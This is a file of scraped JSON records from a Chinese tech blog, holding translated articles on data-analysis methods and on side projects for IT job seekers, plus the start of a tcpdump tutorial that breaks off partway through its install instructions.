{"tags": "IT技术", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2017/11/bfd294e463b91301495b8a73809dd0df.jpg"], "title": "有了数据，需要一些思路。应该从哪开始做数据分析？", "fav_nums": 1, "url": "http://blog.jobbole.com/113157/", "create_date": "2017/12/11", "url_object_id": "83f3e62fd9452b0806ed426c71a48c4e", "comment_nums": 0, "front_image_path": "full/fad684f96e6a245278e9c0c2d1ba98ab5b6dc037.jpg", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文由 <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/chenyahui\">精算狗</a> 翻译，<a href=\"http://www.jobbole.com/members/young605867996\">Lada</a> 校稿。未经许可，禁止转载！<br>英文出处：<a target=\"_blank\" href=\"https://medium.com/towards-data-science/i-have-data-i-need-insights-where-do-i-start-7ddc935ab365\">Rama Ramakrishnan</a>。欢迎加入<a target=\"_blank\" href=\"http://group.jobbole.com/category/feedback/trans-team/\">翻译组</a>。</div><p><strong>「有了数据。我需要一些思路。应该从哪开始？」</strong></p>\n<p>这是个常见的问题。新手数据科学家、数据分析师，以及刚刚接触数据科学的管理人员，通常有这样的疑问。</p>\n<p>他们的老板都在承受着压力，得证明花在系统上去收集、存储及组织资料的钱是有回报的，更不用说还有那些花在数据科学家身上的钱。</p>\n<p>他们偶尔很幸运——待解决的问题可能非常明确，而且被深入研究过（例如，预测哪个客户可能会取消手机合约）。在这种情况下，有很多种方法来进行数据分析，这是数据科学的天堂。</p>\n<p>但是他们拿到的经常都是一个简单的问题：“做个数据挖掘，看看能挖到什么有趣的东西”。</p>\n<p><img class=\"alignnone\" src=\"http://wx3.sinaimg.cn/mw690/7cc829d3gy1fmiis44ysxj20lo0cm3z9.jpg\" width=\"690\" height=\"402\"></p>\n<h3>从哪开始呢？</h3>\n<p>这是个很困难的问题，而且没有唯一完美的答案。我确信前人已经推断出很多方法了。下面是我发现的一个有用的方法。</p>\n<p>该方法基于两个观点：</p>\n<ol>\n<li>每个企业都可以看作是由很多可变部分组成的复杂系统。没人能 100% 弄懂它。即使是有经验的员工，他们对企业的理解和它实际的运作也是有差别的。由于每个企业都在不断变化，这种差别只会越来越大。</li>\n</ol>\n<ol start=\"2\">\n<li>你所掌握的与企业相关的任何数据，都能描绘这个复杂系统某些方面的运转状态。</li>\n</ol>\n<p>有了这两点，依据所有能加强你对系统<strong>实际</strong>运作理解的事物，你可以想出一个“思路”。它能填补你在系统工作和实际运作之间的认知差距。</p>\n<p>或者，借用 Andy Grove 的《给经理人的第一课》（High Output Management）中的一个类比，复杂系统相当于是黑匣子，而思路就像是黑匣子边上开的窗户，“照亮”里面发生的一切。</p>\n<p>所以寻找思路的过程，可以看作是通过分析数据，理解一个复杂事物的<strong>实际</strong>运作方式所付出的努力。</p>\n<p>而这正是科学家们在做的事！这个世界复杂得让人难以置信，科学家们正是通过一种不断实践和检验的<a href=\"https://en.wikipedia.org/wiki/Scientific_method\">科学方法（the Scientific Method）</a>，来逐步提高我们对世界的认识。</p>\n<p>通俗地说：</p>\n<blockquote><p>利用他们当前对系统运作的理解（“理论”）做出一定的预测。</p>\n<p>然后检验数据（<a href=\"https://www.nasa.gov/feature/goddard/2016/nsf-s-ligo-has-detected-gravitational-waves/\">有时需要准备精心设计的实验来生成数据</a>）是否符合预测。</p>\n<p>如果不符合预测，就要研究发生了什么，并更新他们的认识（“修改理论”）。</p>\n<p>做出新的预测。重复这个过程。</p></blockquote>\n<p>数据科学家和分析师能做的也是同样的事。</p>\n<blockquote><p>在探索数据之前，准备好一个清单，写下来你期望从数据中看出什么：关键变量的分布，重要变量之间的关系等等。这样一个清单实质上就是基于当前对企业的理解而做出的预测。</p>\n<p>现在来分析数据。画统计图、总结，以及任何能验证数据是否符合预期的分析方法。</p>\n<p>有不符合预期的地方吗？有让你发出“这很奇怪啊。”或者“这不合理啊。”这种感慨的地方吗？</p>\n<p>放大来看，试着弄清楚企业的哪部分导致了数据中这种奇怪的现象。这也是关键步骤。</p>\n<p>你可能就此找到了了解企业的思路，并且加强了理解。</p></blockquote>\n<p>举个真实的例子。几年前，我们在研究一个大型 B2C 零售商的交易数据。数据集的一个字段是“交易金额”。</p>\n<p>我们的预期是什么？我们预期大多数交易金额都在均值附近，但是可能会存在一些偏小的金额和偏大的金额。所以该字段的柱状图很可能看起来是这样的：</p>\n<p><a href=\"http://jbcdn2.b0.upaiyun.com/2017/09/f879c90ee94d06e0bbb62bbdd880f997.png\"><img src=\"http://jbcdn2.b0.upaiyun.com/2017/09/f879c90ee94d06e0bbb62bbdd880f997.png\"></a></p>\n<p>但是我们检验数据后发现，它看起来是这样的：</p>\n<p><a href=\"http://jbcdn2.b0.upaiyun.com/2017/09/a165abd743314397986623f6e887e00e.png\"><img src=\"http://jbcdn2.b0.upaiyun.com/2017/09/a165abd743314397986623f6e887e00e.png\"></a></p>\n<p>我们调查了“hmm”那部分的交易数据。</p>\n<p>原来这些交易不是来自于他们的常客——为孩子购物的年轻妈妈们；而是来自于那些一年来美国旅游一次的外国人。他们来商店购买大量的物品，回国后在他们自己的商店销售。这些分销商与我们的零售商没有任何特别的关系。</p>\n<p>该零售商当时在北美以外没有实体店，他们在电商网站上销售的商品也不运往这些地区。但是这些地区的需求量又足够多，促使当地企业如雨后春笋般涌现，填补空缺。</p>\n<p>这个微不足道的“发现”会引出一系列有趣的连锁问题。比如，这些分销商买了哪些商品，什么样的促销活动最适合他们，以及如何使用这些数据来影响全球扩张计划。</p>\n<p>所有这些都来自于一个简单的柱状图。</p>\n<p>美国著名科幻小说家艾萨克·阿西莫夫（Isaac Asimov）完美地领会了这个精神。</p>\n<blockquote><p>科学研究中最令人激动的话，预示着新发现的话，不是“找到啦！”而是“真有趣……”  —— 艾萨克·阿西莫夫</p>\n<p>伯乐在线补注：艾萨克·阿西莫夫是著名的科幻小说家，《基地系列》、《银河帝国三部曲》和《机器人系列》三大系列被誉为“科幻圣经 ”。在他的小说《I，Robot》的引言中，提出了机器人学三定律。</p></blockquote>\n<p>要知道从数据出发找到企业的“根本动机”需要时间、精力以及耐心。如果你在企业中拥有一些的人脉，能回答你的问题，你会有更多发现。另外，你觉得奇怪的事，他们可能已经习以为常了（因为他们对该企业的了解可能比你更多），这样你能节省很多时间。</p>\n<p>越能理解企业中这些细微差别，你的预测会越有指向性，并且最终会有越好的发现。所以，尽你所能去挖掘企业中的各种细节。寻找了解企业的同事，向他们学习，如果可能的话把他们发展成你的同伴。</p>\n<p>掌握数据科学知识是件好事，但是掌握一些企业相关的知识也会让你的工作质量大幅提升。</p>\n<p>在数据科学之外，我发现“预测——检查”的思维方式在任何分析上都很有用。</p>\n<p>在“翻页”之前，停下来思考一会儿，猜想一下哪种事是你希望看到的。你会发现这样能增加对照，并且更能从数字的海洋中发现趣事了。</p>\n<p>或者你会发现在收集数据或是计算时出了错。（Twyman 定律）</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113157\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113157votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113157\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/chenyahui\">精算狗</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/chenyahui\">\r\n\t\t\t<img src=\"http://jbcdn2.b0.upaiyun.com/2015/04/8fbdaaa5ea6d3b49c8c1c825aafeb5d9.png\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            简介还没来得及写 :）        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/chenyahui\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/chenyahui/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/chenyahui/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 17</a> · <a title=\"QQ：564968845\" target=\"_blank\" href=\"#\"><i class=\"fa fa-qq\"></i></a> <a title=\"个人微信：564968845\" target=\"_blank\" href=\"#\"><i class=\"fa fa-weixin\"></i></a>         </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "praise_numbers": "1"}
{"tags": "职场", "front_image_url": ["http://ww1.sinaimg.cn/mw690/7cc829d3gw1eizj4ql2huj20eq0b0wfx.jpg"], "title": "利用副项目找 IT 工作，需要满足这 3 个原则", "fav_nums": 1, "url": "http://blog.jobbole.com/113443/", "create_date": "2018/01/08", "url_object_id": "53d4edab180cf29ce21917e0cf1f3361", "comment_nums": 0, "front_image_path": "full/3dec15374f3b9e62441c4d320c8998dd12c43dc8.jpg", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文由 <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/zhj318\">飞哥的咖啡</a> 翻译。未经许可，禁止转载！<br>英文出处：<a target=\"_blank\" href=\"http://hackcareer.com/side-project/\">DJ Chung</a>。欢迎加入<a target=\"_blank\" href=\"http://group.jobbole.com/category/feedback/trans-team/\">翻译组</a>。</div><div>\n<h3>确保副项目不是在浪费你的时间</h3>\n<p id=\"0d40\" class=\"graf graf--p graf-after--figure\">为了在 IT 科技领域谋求一份工作而做副项目，这要不就是极好利用时间，就是在极大浪费时间。</p>\n<p>特别当你有一个非技术的背景时，副项目可以帮助你进入科技行业。或者恰好相反，即便你花了很多精力与时间，也不会有任何帮助和影响。</p>\n<p>仅仅拥有一个副项目并不意味着它能帮你找到工作。</p>\n<p><img class=\"alignnone\" src=\"http://ww1.sinaimg.cn/mw690/7cc829d3gw1eizj4ql2huj20eq0b0wfx.jpg\" width=\"530\" height=\"396\"></p>\n<h3>你的副项目本身可能不会给你带来工作</h3>\n<p id=\"3289\" class=\"graf graf--p graf-after--h3\">为了在求职时凸显或加强你的工作经验，这里有两种不同类型的副项目：</p>\n<p id=\"10b3\" class=\"graf graf--h4 graf-after--p\"><strong>1. “梦幻成真”般的副项目</strong></p>\n<p> </p>\n<p>这是那种“做了就会有人主动上门”的副项目。它本身非常吸引人，所以即使没有积极地找工作，你也能得到工作机会。</p>\n<p>* 如果你没有这方面的推荐，可以看看电影《 Field of Dreams | 梦幻成真》”。</p>\n<p id=\"a474\" class=\"graf graf--p graf-after--p\">每年都会发生类似的事情，就是某个人做了个惊人的副项目，然后被他人主动提供了工作机会。</p>\n<p id=\"c7a0\" class=\"graf graf--p graf-after--p\">我能想到的例子，是 <a class=\"markup--anchor markup--p-anchor\" href=\"https://feross.org/\" target=\"_blank\" rel=\"nofollow noopener\">Feross Aboukhadijeh</a> 在 2010 年做的副项目 <a class=\"markup--anchor markup--p-anchor\" href=\"http://ytinstant.com/\" target=\"_blank\" rel=\"nofollow noopener\">YouTube Instant</a>，它还是在六小时内完成的！此项目一炮而红，成为了媒体焦点，并<a class=\"markup--anchor markup--p-anchor\" href=\"https://feross.org/youtube-instant-media-frenzy/\" target=\"_blank\" rel=\"nofollow noopener\">让他直接从 YouTube 联合创始人 Chad Hurley 那里获得了一份工作</a>。</p>\n<p id=\"ed69\" class=\"graf graf--p graf-after--p\">我阅读这篇文章的时候受到启发，一个副项目可以获得如此多的关注，甚至是一个现成的工作机会，特别当我寻求名牌科技公司工作机会的时候，感受更加深刻。但与此同时，我也禁不住有点泄气，YouTube Instant 是能够谋求技术工作的副项目标准吗？<strong>（不是这样的！）</strong></p>\n<p>不用说，即使项目自身的创建没有花费很长时间，但“梦想之地”级别的副项目也依赖于世界级的技能，而这些技能的开发和培养可能需要数年的时间。</p>\n<p id=\"b7c6\" class=\"graf graf--h4 graf-after--p\"><strong>2、“尽量努力（A for effort）”副项目</strong></p>\n<p>“尽量努力”副项目意味着，你不能再花多余的时间去做一些有趣的事情了。无论如何，你所生产的东西可能不会令人惊奇到雇主们会提供给你工作机会。老实说，大部分的副项目都是此类型的。</p>\n<p class=\"graf graf--p graf-after--p\"><img class=\"alignnone\" src=\"http://wx2.sinaimg.cn/mw690/7cc829d3gy1fn9bkdf0e1g20dc07ahdt.gif\" width=\"480\" height=\"262\"></p>\n<p id=\"cd07\" class=\"graf graf--p graf-after--p\">或许你学了编程，并做了个小的应用程序来跟踪读过的书；或许你做了个带有旅行故事的照片博客。又或许你围绕着喜欢的主题（如烹饪等），做了个 YouTube 创意视频库。</p>\n<p>不管怎么说，“尽量努力”副项目是你可以自豪地放在简历上，来体现工作质量的。</p>\n<p id=\"e874\" class=\"graf graf--p graf-after--p\"><em>旁注：学习一项技能不是一个副项目，你必须做成一些事情。上完周末的 JavaScript 课程不是一个副项目，放在简历上也无足轻重。</em></p>\n<p id=\"f1b7\" class=\"graf graf--p graf-after--p\">那么，如何确保“尽量努力”副项目为你的应用程序增加了价值，而不是白白浪费了你的时间呢？</p>\n<h3 id=\"3481\" class=\"graf graf--h3 graf-after--p\">优质副项目的 3 个原则</h3>\n<p id=\"ef0d\" class=\"graf graf--p graf-after--h3\">在申请工作时，能为你增加额外价值的优质副项目，必须是相关的、有深度的，并且至少经历两次迭代。</p>\n<h4 id=\"e338\" class=\"graf graf--h4 graf-after--p\">1. 你的副项目是否与申请的工作相关？</h4>\n<p id=\"a241\" class=\"graf graf--p graf-after--h4\">相关的副项目可以在你的简历中提供更多的优势，但更重要的是，它们可以帮助体现你的工作经验。</p>\n<p>举个例子，如果你有一个非技术的背景，但申请的岗位更倾向于技术背景（如一些产品管理角色），那么学习做一个简单 iPhone 应用程序的编程项目，就可以成为一个好的副项目。如果能成功地将 iPhone 应用程序发布到 App Store，不仅可以学习到技术概念，还可以将这份经验应用到从头构建软件产品中去。</p>\n<p id=\"6d9b\" class=\"graf graf--p graf-after--p\">又或者你正在申请一个内容营销的岗位，但没有直接的工作经验。一个相关的副项目可以是建立一个博客（尽管可能会很小），放些你感兴趣的小众话题，吸引那些对话题有忠诚度和参与感的围观群众。</p>\n<h4 id=\"6c3f\" class=\"graf graf--h4 graf-after--p\">2. 你的副项目有深度吗？</h4>\n<p id=\"b2dd\" class=\"graf graf--p graf-after--h4\">这是一个主观向的原则。它的另一种问法是，你的项目是否表明你投入了思想和努力，或者它只是你为了显示其存在而匆忙拼凑出的东西？</p>\n<p>你的副项目并不一定是下一个新的病毒社交媒体应用程序，但它必须是你做出来能引以为豪的东西。</p>\n<p id=\"7544\" class=\"graf graf--p graf-after--p\">继续使用 iPhone 应用程序副项目做例子，如果有人下载使用它，以此为基础，它是否能够正常工作？再进一步地问，它是否展示出你考虑过用户体验，使它相对易用？你是否考虑过边界情况并尝试解决它们？</p>\n<p id=\"8b63\" class=\"graf graf--p graf-after--p\">在一天结束的时候，问问自己，你的副项目是否是对你实际工作质量的精准体现，因为你要申请的公司就是这么想的。</p>\n<h4 id=\"92bb\" class=\"graf graf--h4 graf-after--p\">3. 你的副项目经历至少两次迭代吗？</h4>\n<p id=\"650e\" class=\"graf graf--p graf-after--h4\">你要证明你对自己的工作有足够的关心，并在积极地寻求改进。</p>\n<p class=\"graf graf--p graf-after--p\">如果你做了个应用程序，在发布了初版后，你是止步不前，还是从一些用户那里获取反馈并做出相应的改进？</p>\n<p class=\"graf graf--p graf-after--p\">如果你开始写博客，你是只写了几篇文章，还是写了几十篇文章？来表明你不仅致力于制作高质量的内容，而且还想完成一整套的作品。</p>\n<p>展示你的副项目，不仅只是把它放在简历上，让别人看到你投入时间和精力做出的成果，并且让审查人员觉得花费额外的时间来看看其背后深层次的内容和想法。</p>\n<h3 id=\"1e6b\" class=\"graf graf--h3 graf-after--p\">你必须让人注意到你的副项目</h3>\n<p id=\"be37\" class=\"graf graf--p graf-after--h3\">即使你的副项目遵循了这三条原则，如果你的副项目在审查简历或面试的过程中被人忽视，那就毫无作用，等于白做了。</p>\n<p id=\"8683\" class=\"graf graf--p graf-after--p\">如果你认为副项目真的能在职位申请中有所帮助，那就把它加入简历中，并注意放在简历的顶端。想清楚该怎样描述它的内容，以及你是如何进行的，这样才能让这份宝贵的经验更有价值。如果仍有余力，你还可以给出信用指标，比如可以度量的数值或者成就，包括用户数量、App Store 评级和发布功能等等。</p>\n<p>另外，不管你的副项目是什么，你都要在公众能够访问的站点上，比如你的个人博客或 Medium，发帖记录你所取得的进展，并把网站链接放入简历中。</p>\n<p>帖子中必须反映出你在进行副项目的过程中，学到的东西、获得的成就，以及面临的挑战。同时，利用截屏、演示视频或其他相关的记录方式，全方位多角度地展示你的项目。务必在 LinkedIn、Facebook 和 Twitter 的所有数字档案中加入网站的链接。</p>\n<p>你已经将大量的时间花在了副项目上，而这些时间原本可以用于别处，所以请务必展现出对自己辛勤工作的由衷自豪感！</p>\n</div>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113443\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113443votetotal\">2</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113443\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/zhj318\">飞哥的咖啡</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/zhj318\">\r\n\t\t\t<img src=\"http://jbcdn2.b0.upaiyun.com/2016/09/9667abaa540914200edd449974fb5538.jpg\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            I'm OUT, never IN.        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/zhj318\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/zhj318/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/zhj318/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 48</a> · <a title=\"QQ：574375911\" target=\"_blank\" href=\"#\"><i class=\"fa fa-qq\"></i></a>         </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "praise_numbers": "2"}
{"tags": "IT技术", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/01/5ebb3cabbd33c5371bc0c678d230f5fd.png"], "title": "通过实例学习 tcpdump 命令", "fav_nums": 3, "url": "http://blog.jobbole.com/113452/", "create_date": "2018/01/09", "url_object_id": "4dc4d70b33802e7da16f0e631551759d", "comment_nums": 0, "front_image_path": "full/36166d0ecc27103ef7e4ded0df8d95ba560feac4.jpg", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"http://linuxtechlab.com/learn-use-tcpdump-command-examples/\">Shusain</a>   译文出处：<a target=\"_blank\" href=\"https://linux.cn/article-9210-1.html\"> DarkSun</a>   </div><p><code>tcpdump</code> 是一个很常用的网络包分析工具，可以用来显示通过网络传输到本系统的 TCP/IP 以及其他网络的数据包。<code>tcpdump</code> 使用 libpcap 库来抓取网络报，这个库在几乎在所有的 Linux/Unix 中都有。</p>\n<div id=\"article_content\">\n<p><code>tcpdump</code> 可以从网卡或之前创建的数据包文件中读取内容，也可以将包写入文件中以供后续使用。必须是 root 用户或者使用 sudo 特权来运行 <code>tcpdump</code>。</p>\n<p>在本文中，我们将会通过一些实例来演示如何使用 <code>tcpdump</code> 命令，但首先让我们来看看在各种 Linux 操作系统中是如何安装 <code>tcpdump</code> 的。</p>\n<ul>\n<li>推荐阅读：<a href=\"http://linuxtechlab.com/monitoring-network-bandwidth-iftop-command/\">使用 iftop 命令监控网络带宽 </a></li>\n</ul>\n<h1 id=\"toc_1\">安装</h1>\n<p><code>tcpdump</code> 默认在几乎所有的 Linux 发行版中都可用，但若你的 Linux 上没有的话，使用下面方法进行安装。</p>\n<h2 id=\"toc_2\">CentOS/RHEL</h2>\n<p>使用下面命令在 CentOS 和 RHEL 上安装 <code>tcpdump</code>，</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f39926df47486273123\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ sudo yum install tcpdump*</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f39926df47486273123-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f39926df47486273123-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">sudo </span><span class=\"crayon-e\">yum </span><span class=\"crayon-e\">install </span><span class=\"crayon-e \">tcpdump*</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p></p>\n<h2 id=\"toc_3\">Fedora</h2>\n<p>使用下面命令在 Fedora 上安装 <code>tcpdump</code>：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f39926df51977449555\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ dnf install tcpdump</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f39926df51977449555-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f39926df51977449555-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">dnf </span><span class=\"crayon-e\">install </span><span class=\"crayon-v\">tcpdump</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p></p>\n<h2 id=\"toc_4\">Ubuntu/Debian/Linux Mint</h2>\n<p>在 Ubuntu/Debain/Linux Mint 上使用下面命令安装 <code>tcpdump</code>：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f39926df55758905094\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button 